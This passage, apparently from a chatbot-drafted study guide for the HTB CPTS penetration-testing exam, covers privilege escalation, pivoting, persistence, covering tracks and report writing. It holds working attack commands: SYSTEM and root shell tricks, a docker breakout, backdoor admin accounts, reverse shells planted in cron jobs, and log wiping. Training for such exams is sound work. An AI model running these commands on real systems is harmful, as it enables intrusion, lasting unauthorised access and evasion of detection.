+If SeImpersonatePrivilege is present (check whoami /priv for it = Enabled), you can try PrintSpoofer (if Windows version is appropriate) by running:
+bash
+Copy
+Edit
+PrintSpoofer.exe -i -c cmd
+This yields a SYSTEM shell if successful.
+JuicyPotato or RoguePotato variants might be needed for older/newer Windows versions accordingly. They exploit the RPC/EPMAP and COM services to get a SYSTEM token.
+Scheduled Tasks: Check SCHTASKS /query /FO LIST /V for tasks. If any task runs as SYSTEM and calls a script or program that is writable, you can modify that.
+Insecure Registry Settings: Sometimes auto-run keys or service registry entries are improperly ACL’d. For instance, if you can write to HKLM\Software\Microsoft\Windows\CurrentVersion\Run and a privileged process reads it, you can execute code as that process’s user.
+AlwaysInstallElevated: A specific misconfig where two registry values are set (HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated and the equivalent in HKCU). If both are 1, any MSI package will run with elevated (SYSTEM) privileges. Check:
+powershell
+Copy
+Edit
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+If both present and = 0x1, create a malicious MSI to get SYSTEM (for example with msfvenom or use msiexec /quiet /qn /i shell.msi).
+Miscellaneous: Look for stored credentials (with tools like Mimikatz for cached creds), or if the user is part of the Local Administrators group inadvertently somewhere.
+Use automated scripts like WinPEAS (which enumerates all of the above and more) to quickly find potential privesc vectors. Manual verification or exploitation follows. Expected Outcome: Elevation from a regular user to SYSTEM or Administrator on that Windows host. For example, you modify a service binary and restart it to spawn a SYSTEM shell, or you run JuicyPotato and get a SYSTEM command prompt (whoami now shows NT AUTHORITY\SYSTEM). This full control of the box lets you dump credentials, install backdoors, etc., and importantly pivot to other internal systems if needed.
+Linux Privilege Escalation
+For any Linux foothold (low-privilege shell), enumerate the system to find escalation paths:
+SUID/SGID Binaries: Find files with the SUID bit (and SGID for interesting groups like root) set, because they run with elevated privileges:
+bash
+Copy
+Edit
+find / -perm -4000 -type f -printf "%p\n" 2>/dev/null
+Review the list for unusual binaries or those known from GTFOBins (a list of binaries that can be exploited when setuid). For example, if you find /usr/bin/nmap has SUID bit, you could use interactive mode or --script to break out to a shell (older nmap versions allow !sh). Another example: SUID python or vim can be abused to get root shells (rare but possible).
+If there's a custom SUID binary (e.g., an internally developed program), analyze it for vulnerabilities (buffer overflow, or it calls system() without dropping privileges, etc.). This might require downloading it and reverse engineering or just trial input to exploit.
+World-Writable Cron Jobs or Scripts: Check scheduled tasks:
+System-wide cron jobs: /etc/crontab, and files in /etc/cron.d/, /etc/cron.daily/ etc. See if any script is running as root that you can edit. For example, a cronjob executing /usr/local/bin/backup.sh as root – if you can edit that file (check permissions), you can insert your own commands.
+User crontabs: crontab -l (for current user, but if you can read others' crontabs in /var/spool/cron, might find something).
+Timer services (systemd timers) similarly might call scripts on schedule.
+If a writable cron is found, adding a reverse shell payload to it will get executed by root on the next run.
+Path Hijacking (Cron or Services): If a cron job or service executes a command without an absolute path, e.g., calls tar or wget without specifying full path, and it runs with elevated privilege, you can potentially put a malicious executable earlier in the PATH.
+For instance, a root cronjob runs backup.sh which calls tar on something. If you can write to a directory in root’s PATH (say /usr/local/sbin is writable), create a fake tar that spawns a shell, and set PATH so that directory comes first (or edit the script to alter PATH). When cron runs, it will use your malicious tar.
+Sensitive Files: Sometimes passwords or keys are left in files:
+Check /etc/passwd if any user has a shell like /bin/bash but no password (rare on modern systems).
+Look in home directories for config files with creds (.mysql_history, .ssh/id_rsa keys without passphrase, config.php files for web apps, etc.).
+If you find an SSH private key, use it (perhaps the user reused it on root account or another server).
+Check /var/backups, configuration files in /etc (like apache2/sites-available for database creds).
+Kernel Exploits: If the kernel is outdated, a kernel-level exploit might be the only way. Use uname -a to get kernel version. Compare with known exploit lists or run searchsploit linux kernel <version>.
+Classic examples: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), recent overlayfs or user namespace exploits. If the exam allows compiling or transferring exploit code, you can use these.
+Caution: kernel exploits may crash a system. Use them as last resort and ensure you won’t lose needed access.
+Docker/LXC Breakouts: If you find yourself in a container (e.g., user is in the docker group or environment indicates a container), you can often break out if you have privileges like docker group membership (which is effectively root on the host if you can run a new container). Running docker run -v /:/mnt --rm -it alpine chroot /mnt sh will give host root in such cases.
+GTFOBins: Refer to GTFOBins for any binary that has SUID or any command you can run as root via sudo (if you find any sudo permissions with sudo -l). For instance, if sudo -l shows you can run zip as root with no password: sudo zip exploit.zip /etc/passwd -T --unzip-command="sh -c /bin/sh" will pop a root shell (a known GTFOBin trick).
+Processes: See if any root process is running that might be exploitable. For example, a root process listening on a socket that you can talk to might have vulnerabilities, or a screen/tmux session left by root you can attach to if permissions are bad.
+LinPEAS: Like WinPEAS, LinPEAS script automates a ton of these checks. Running it can highlight things like bad perms, world-writable files, etc. Make sure to manually verify anything it flags.
+Expected Outcome: Gaining root on the Linux box. You’ll know you succeeded when id shows uid=0(root) or whoami returns root. At that point, you can read protected files (perhaps a flag in /root directory), and proceed to use this position to move laterally (maybe use the now-root box to pivot to networks it has access to, or dump creds from it).
+Pivoting & Tunneling Techniques (Chisel, Proxychains, SSH Tunnels)
+In a multi-network exam, your initial foothold might be on an edge/DMZ machine that has access to an internal network you can’t reach directly. Pivoting is the process of using the compromised host as a jumping point into the internal network.
+Identify Pivot Points: On the compromised host, check network interfaces and routes:
+ipconfig (Windows) or ifconfig/ip a (Linux) to see if there's another internal IP (e.g., the machine has one interface in 10.10.10.x and another in 10.10.20.x).
+route print (Windows) or ip route (Linux) to see what networks it can reach.
+From that host, try pinging or scanning likely internal IP ranges to confirm connectivity (e.g., ping 10.10.20.1, etc.).
+Port Forwarding: If you want to access a specific service in the internal network from your machine, you can set up port forwards.
+SSH Tunnels (if the compromised host is Linux and you have SSH access, or you can run an SSH client on it):
+Local Port Forward: ssh -L 1433:10.10.20.50:1433 user@pivot-host – After running this from your attacker machine, connecting to localhost:1433 on your attacker will actually connect through the pivot host to 10.10.20.50:1433 (e.g., a database).
+Remote Port Forward: ssh -R 8080:10.10.0.5:80 user@pivot-host – If your attacker machine can accept connections, this would make the pivot host open port 8080 that leads back to 10.10.0.5:80 on your system (less common usage in exams).
+Dynamic Port Forward (SOCKS proxy): ssh -D 9050 user@pivot-host – This opens a SOCKS5 proxy on your attacker at port 9050 that forwards through the pivot. You can then configure proxychains to use socks5 127.0.0.1 9050. This is useful for flexible pivoting (you can then proxy nmap, RDP, browsers, etc. through the pivot easily).
+Meterpreter/Plink: If using metasploit's meterpreter, you can add routes in meterpreter to pivot. Or use plink (PuTTY link) on Windows targets to create similar tunnels to SSH (if an SSH server is reachable).
+Proxychains: A tool to route any program's traffic through a proxy (like the dynamic SSH socks or other proxies).
+Configure /etc/proxychains.conf to add socks5 127.0.0.1 9050 (for SSH dynamic, or whatever proxy).
+Then run tools as proxychains <tool> to force them to use the proxy. For example:
+bash
+Copy
+Edit
+proxychains nmap -sT -Pn -p 80,445 10.10.20.0/24
+This would scan the 10.10.20.0/24 network from the pivot host's perspective (because nmap connects through the proxy).
+Use proxychains for RDP (proxychains xfreerdp ...), or browsing internal websites (proxychains firefox 10.10.20.5).
+Chisel: A fast Golang-based tool for creating tunnels. It can work in reverse mode which is great when the pivot is behind NAT relative to you (common in exams: your target can reach you, but you cannot directly reach the internal network).
+To use Chisel, you typically run a chisel server on your attacker machine and a client on the pivot (or vice versa depending on scenario):
+On attacker (Kali), start a chisel server listening for a connection:
+bash
+Copy
+Edit
+./chisel server -p 8000 --reverse
+This opens port 8000 for the chisel client to connect.
+On the compromised host (pivot), run chisel client to connect back to your server and set up port forwards or a SOCKS proxy. For example, to forward RDP of an internal host (10.10.20.51:3389) to your machine:
+bash
+Copy
+Edit
+chisel.exe client <YourVPN_IP>:8000 R:13389:10.10.20.51:3389
+This means: on your machine, port 13389 is now listening; any connection to it will be forwarded to 10.10.20.51:3389 via the pivot. You could then xfreerdp /v:127.0.0.1:13389 to RDP to that internal host.
+Alternatively, Chisel can create a full SOCKS proxy:
+On your machine: chisel server -p 8000 --reverse as before.
+On pivot: chisel.exe client <YourVPN_IP>:8000 R:1080:socks – this sets up a remote SOCKS proxy. Actually, in chisel syntax, to get a socks proxy you run a chisel server in socks mode on one side.
+Another approach: Run chisel in socks mode on your machine and connect from pivot (reverse of above example from documentation). The end result is you get a listening SOCKS proxy on your attacker that tunnels through pivot. Once you have a socks proxy (say on 1080), use proxychains as described.
+Chisel is very flexible; just remember server runs on one side, client on the other. The --reverse flag is used when the client (pivot) is initiating the connection but you want to forward ports from the client’s side back to the server’s side.
+Other Tunnels:
+Sshuttle: a tool to create a quick VPN-like tunnel (if Python available on target and SSH on attacker).
+SOCKS via Meterpreter: If using Metasploit, auxiliary/server/socks_proxy can create a proxy and add route to pivot through meterpreter.
+VPN agent: In some cases, one might transfer and run OpenVPN or Wireguard on the pivot if allowed, to directly VPN into the network.
+Expected Outcome: The ability to access internal network resources through your foothold. Practically, this means you can enumerate and exploit machines in the internal network segment just as if you were in that network. For instance, after pivoting, you perform Nmap scans against the 10.10.20.x range (through proxychains or by dropping into a proxy shell) and discover a Domain Controller and other servers, which you can then attack (using the AD techniques above, etc.). Pivoting ensures no part of the target network is off-limits despite network segmentation.
+5. Post-Exploitation & Reporting
+After rooting systems and achieving the objectives (capturing flags, dumping credentials), focus on maintaining access, cleaning up, and preparing the report with all necessary details.
+Maintaining Persistence & Covering Tracks
+Persistence Techniques (use sparingly in exam, but good to know for real engagements):
+Create New Accounts: On Windows, add a new local admin or domain user:
+cmd
+Copy
+Edit
+net user pentest Passw0rd! /add /fullname:"System Admin"
+net localgroup administrators pentest /add
+Or in a domain: net group "Domain Admins" pentest /add /domain (only if you have DA and want persistent DA user). On Linux, add a user to /etc/passwd or /etc/sudoers.
+SSH Keys: On Linux, place your public key in ~/.ssh/authorized_keys for root or any user to maintain access without password.
+Scheduled Tasks / Startup: Set a malicious program to run at startup:
+Windows: use schtasks /create to make a task that launches a reverse shell daily or on boot. Or add a value under HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+Linux: add a cronjob in /etc/crontab or ~/.bashrc reverse shell (though noisy).
+Backdooring Services: Replace an often-used binary with a trojaned version that includes a backdoor (for exam, not necessary).
+Golden Tickets: In AD, forging a golden ticket means you can re-access the domain as any user for the lifetime of the krbtgt hash (until changed)​
+TARLOGIC.COM
+. You could create a golden ticket for a fictitious user and come back anytime within 10 years if you set the ticket lifespan long (though in exams, the environment is temporary).
+Be mindful: in an exam, persistence is mostly to ensure you don't lock yourself out. Setting up a simple reverse shell listener or adding an admin user for convenience is usually enough, since you have long exam time. Just don't do something that might break the system (like a malicious service that destabilizes a machine). Covering Tracks:
+Logs: Clear sensitive logs that might contain your activity or might fill up:
+Windows:
+powershell
+Copy
+Edit
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+This clears event logs​
+ATTACK.MITRE.ORG
+. Be cautious: clearing logs is itself an event (ID 1102). Alternatively, use PowerShell Clear-EventLog cmdlet. Also, delete specific entries in security log via advanced techniques if needed (less likely in exam).
+Linux:
+bash
+Copy
+Edit
+> /var/log/auth.log
+> /var/log/syslog
+history -c
+Overwrite or truncate logs. Remove your commands from bash history (history -d <line> or just history -c && history -w).
+Artifacts: Remove any tools or files you uploaded:
+Delete scripts like WinPEAS, SharpHound, Mimikatz binaries, exploits, etc., from the target.
+Remove any dropped payloads (web shells from /var/www, or executables on disk).
+Delete temporary files you created (e.g., output files).
+Revert any changes if possible:
+If you altered a configuration (like added yourself to admins or changed a service binary path), and it's not needed for maintaining access, consider reverting to avoid obvious signs. However, in an exam, you might leave it as-is since there's no real admin monitoring.
+For courtesy, if the exam requires, restore the environment (some exams want you to revert any system changes, check CPTS instructions on cleanup).
+Screenshots and Notes: These aren’t exactly tracks, but ensure you have captured evidence of everything before you cover tracks. Once you clear logs or remove shells, you lose that evidence. So, document first, then clean.
+Expected Outcome: The target environment remains under your control, but with minimal evidence of your activities. In a real-world scenario, this helps avoid detection; in the exam context, it shows you know how to be stealthy (though the primary goal is usually just to get the flags). For the report, you might not need to detail covering tracks, but persistence mechanisms could be reported as additional findings or used to demonstrate you considered post-exploitation actions.
+Documenting Findings Efficiently for CPTS Report
+Throughout the exam, it’s critical to document your steps and findings in detail so that writing the report is straightforward:
+Note-Taking Strategy: Use a structured notes template. For example, have sections per target host:
+Host IP/Name, open ports, vulnerabilities found, credentials found, flags found, etc.
+Under each vulnerability or attack, note the exact steps (commands) used and the outcome. If a command produced important output, record that output (or the relevant snippet) in your notes.
+Timestamp or order your actions logically – this will help in writing the narrative of how you pivoted and escalated.
+Screenshots: Take screenshots of key evidence:
+Flags captured (show the content of the flag file on screen).
+Proof of command execution (e.g., a screenshot of a shell where whoami shows SYSTEM after a successful priv esc).
+Any GUI where needed (maybe an admin panel exploitation).
+BloodHound graph findings if used (though in a report you might not include the whole graph, maybe a key snippet).
+Organize Credentials: Maintain a table of all credentials obtained (username, password or hash, how it was obtained, where it worked). This helps ensure you tried each credential on all possible services and is also good for the report appendix.
+Keep Command Outputs: For things that will go into the report’s technical details, have them readily copy-pasteable. For example, if you crack a hash to a password, save that section of the hashcat output. If you exploit SQLi to dump a table, keep a snippet of the dumped data showing success.
+Efficient Tools: If allowed, use Obsidian or CherryTree to jot down notes in real-time. Use markdown features (which will carry over to GitLab if needed) like bullet lists for steps, and code blocks for commands and outputs (as we are doing in this guide).
+Outline the Report Early: The CPTS report requires specific sections and details (see next subsection). It can help to create an outline in your notes and fill in as you confirm each part:
+For each flag or major finding, ensure you have: Description, Impact, Evidence (screenshot), and Remediation (you can add remediation after the exam when writing the report).
+Write short summaries after each major step while fresh in memory.
+By the time you finish exploitation, your notes should essentially be a detailed log of everything needed to write the report. The report writing will then be a matter of organizing and polishing those notes into the required format, rather than recalling from scratch. Expected Outcome: A well-structured collection of notes and evidence such that writing the final report is straightforward and you won’t accidentally forget any step or proof needed. In an exam setting, this can be the difference between a pass or fail (since missing documentation of a flag or vulnerability could cost points).
+Sample CPTS Report Format with Required Sections
+The CPTS exam report is expected to be professional and include specific sections. Based on HTB’s guidance, the report must include the following sections​
+AKUMA-S.GITBOOK.IO
+:
+Executive Summary – A high-level summary for a manager/executive. Describe the engagement scope, overall results (e.g., “We gained full control of the internal network, X critical issues found”), and the business impact in concise terms. Non-technical language is preferred here. Include the fact that you obtained 12 out of 14 flags (for example) if reporting to exam graders.
+Network Penetration Test Assessment Summary (Summary of Findings) – A bullet-point or tabular summary of all findings/vulnerabilities. List each major finding with a short description and a severity rating. For example:
+SQL Injection on Web Server – Achieved database dump and server compromise (Critical)
+Outdated SMB Service (SMBv1) – Enabled NTLM relay attacks (High)
+Weak Passwords – Led to credential compromise of multiple accounts (High)
+This section is basically an overview of what issues were found, to allow a quick glance of the technical results.
+Internal Network Compromise Walkthrough (with Screenshots) – This is the detailed narrative of how you went from initial access to full pwnage. It should read like a story of the attack:
+Start from the initial recon (e.g., “Discovered an open web server on Host A, which had an SQLi flaw...”),
+then initial foothold (e.g., “Used SQLi to retrieve credentials and logged in via SSH as user X on Host A.”),
+then pivot (“From Host A, scanned internal network, found DC on Host B, executed kerberoast to get hash, cracked to get user Y’s password.”),
+privilege escalation (“Used pass-the-hash with user Y’s hash to gain admin on Host B (Domain Controller). Extracted all domain passwords.”),
+highlight where flags were obtained in this journey.
+Include screenshots at key steps (the exam requirement explicitly says screenshots must be included here). For example, screenshot of the SQLi exploitation, a screenshot of shell on Host A, a BloodHound path if applicable, screenshot of domain admin shell on DC, etc. Make sure the flags captured are evidenced (could be screenshots or just the flag text included in the report).
+Remediation Summary (Short, Medium, Long Term) – Provide recommendations for each major finding, categorized by how quickly it should be addressed:
+Short Term: Things to do immediately, e.g., remove public access to the vulnerable service, change passwords found, patch critical vulnerabilities.
+Medium Term: Configuration or policy changes, e.g., enforce strong password policy, disable SMBv1, implement network segmentation more effectively.
+Long Term: Strategic solutions, e.g., conduct security training, implement an IDS/IPS, plan for periodic pentests. This section is more general best-practice oriented, mapped to the issues you found. It ensures the client (or exam grader) sees that you not only found issues, but know how to fix them or mitigate them in the future.
+Technical Finding Details – For each finding/vulnerability, have a dedicated subsection that includes:
+Description: Explain the vulnerability and where it was found (e.g., “SQL Injection in /products.php on Web Server allows an attacker to retrieve data...”). Include the affected systems.
+Impact: What an attacker can do with it (e.g., “An attacker could dump the entire customer database and obtain login credentials, leading to a full server compromise.”).
+Evidence: Show how you exploited it. This is where you include the commands and outputs or screenshots. For instance, show the malicious SQL payload and the database names output, or the contents of the /etc/passwd file you read via LFI. Provide proof for each step (sanitized if needed).
+Remediation: Specific fix for this issue (e.g., “Sanitize and parameterize SQL queries. Use prepared statements to prevent SQLi.” Or “Apply security patch MSXX-YYY to update SMB service.”). This can overlap with the Remediation Summary but here you give details per finding.
+It’s often good to use a consistent format for each finding, maybe a table or just clearly separated paragraphs.
+Appendices – Include additional supporting material:
+Lists of compromised accounts (username -> password)​
+AKUMA-S.GITBOOK.IO
+.
+Details of subdomains or hosts discovered (if any enumeration like that was done).
+Any lengthy output or code (for example, the full Nmap scan results, full list of hashes cracked) that are relevant but too bulky for the main report.
+Screenshots that weren’t in the main body but you still want to include as evidence for the graders.
+Cleanup notes if required (like a list of changes you made to the systems for exploitation, which is sometimes required so they know what to revert).
+Make sure the report is well-formatted and proofread. Use headings, bullet points, and tables to make it readable. In a professional setting, an 87-page report might be possible​
+AKUMA-S.GITBOOK.IO
+, but for the exam, quality matters more than quantity (include everything asked, but be concise where possible). Final Tip: In the exam context, double-check that you documented all flags and all required screenshots. The report is how the examiners verify your hacks, so it should clearly demonstrate each step you took and the access you achieved. A well-structured methodology as given above, when followed and documented, will naturally lead to an excellent report and a successful CPTS exam outcome.
